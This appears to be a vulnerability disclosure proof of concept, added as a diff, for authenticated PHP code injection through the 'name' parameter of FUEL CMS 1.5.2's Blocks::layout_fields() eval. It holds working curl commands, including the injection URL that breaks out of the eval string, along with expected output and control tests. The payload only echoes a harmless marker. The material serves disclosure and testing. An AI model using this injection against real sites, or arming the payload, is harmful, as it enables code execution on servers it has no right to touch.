@@ -1,0 +1,32 @@
+FUE-01 PoC — Authenticated PHP code injection via name GET param, Blocks::layout_fields() @eval (CWE-94)
+Target: https://github.com/daylightstudio/FUEL-CMS commit 6fd06d4, FUEL CMS 1.5.2 (see TARGET-SOURCE.txt)
+Payload is harmless: it only echoes an md5 marker ("FUELEVAL-".md5("fuel-poc")). No system()/shell calls.
+
+Prerequisites (all verified):
+  1. Valid FUEL admin session (Fuel_base_controller auth gate).
+  2. A block layout registered in $config['blocks'] (MY_fuel_layouts.php) - e.g. 'verify_block'.
+     Without ANY registered block layout, layout_fields() returns before the eval.
+  3. A NON-EMPTY :id URI segment after the layout name - the eval sits inside the
+     if(!empty($id)) branch (Blocks.php:253).
+
+--- Step 1: login ---------------------------------------------------------------------------
+# fetch login form (contains ci_csrf_token_FUEL), then:
+curl -i -c cookies.txt -d "user_name=admin&password=<THROWAWAY-PASSWORD>&Login=Login&ci_csrf_token_FUEL=<TOKEN>" \
+  "http://<FUEL-HOST>/index.php/fuel/login"
+# => HTTP 302 -> /index.php/fuel/dashboard
+
+--- Step 2: eval of attacker-controlled string ----------------------------------------------
+curl -s -b cookies.txt \
+  "http://<FUEL-HOST>/index.php/fuel/blocks/layout_fields/verify_block/1?name=a));%20echo(%22FUELEVAL-%22.md5(%22fuel-poc%22));%20//"
+# => HTTP 200, body contains:
+#    FUELEVAL-5dfc072c655ea55ead079f0cb689c4ce
+# md5("fuel-poc") = 5dfc072c655ea55ead079f0cb689c4ce (computed independently) => arbitrary PHP executed.
+# The eval string becomes: @$_name = (isset($a)); echo("FUELEVAL-".md5("fuel-poc")); //)) ? ...
+
+--- Step 3: controls -------------------------------------------------------------------------
+# a) WITHOUT session cookie -> 302 to /fuel/login/..., no eval (auth gate)
+# b) WITHOUT the :id segment -> no eval:
+curl -s -b cookies.txt \
+  "http://<FUEL-HOST>/index.php/fuel/blocks/layout_fields/verify_block?name=a));%20echo(%22NOEVAL%22);%20//"
+#    => HTTP 200 normal field-form render, no "NOEVAL" in body (eval requires non-empty $id)
+# c) :id present, no name parameter -> HTTP 200 normal render, no user input evaluated
